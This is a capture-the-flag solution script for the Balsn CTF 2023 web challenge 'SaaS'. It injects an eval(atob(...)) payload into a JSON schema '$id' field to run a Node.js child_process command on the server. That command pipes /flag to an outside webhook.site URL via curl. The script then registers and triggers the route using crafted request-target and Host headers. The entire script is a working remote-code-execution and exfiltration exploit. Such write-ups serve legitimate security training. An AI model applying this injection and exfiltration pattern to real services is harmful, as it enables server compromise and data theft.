# Balsn CTF 2023 - [web] SaaS

import subprocess
import json
import base64

# BASE_URL = "http://localhost:8787"
BASE_URL = "http://saas.balsnctf.com:8787"

COMMAND = "cat /flag | curl -X POST https://webhook.site/xxx --data-binary @-"

payload = base64.b64encode(f"console.log(global.process.mainModule.require('child_process').execSync('{COMMAND}').toString())".encode()).decode()

body = {
    "properties": {
        "the old one": {"type": "string"},
    },
    "$id": f'#xxx"+eval(atob("{payload}"))+"',
    "if": {},
    "then": {},
}

proc = subprocess.run(
    [
        "curl",
        "-XPOST",
        BASE_URL,
        "--request-target",
        "http://x.saas/register",
        "-H",
        "Host: easy++++++",
        "-H",
        "Content-Type: application/json",
        "-d",
        json.dumps(body),
    ],
    capture_output=True,
    text=True,
)
assert proc.returncode == 0
print(proc.stdout)

route = json.loads(proc.stdout)["route"]
proc = subprocess.run(
    [
        "curl",
        "-XGET",
        BASE_URL,
        "--request-target",
        "http://x.saas" + route,
        "-H",
        "Host: easy++++++",
    ],
    capture_output=True,
    text=True,
)
assert proc.returncode == 0
print(proc.stdout)
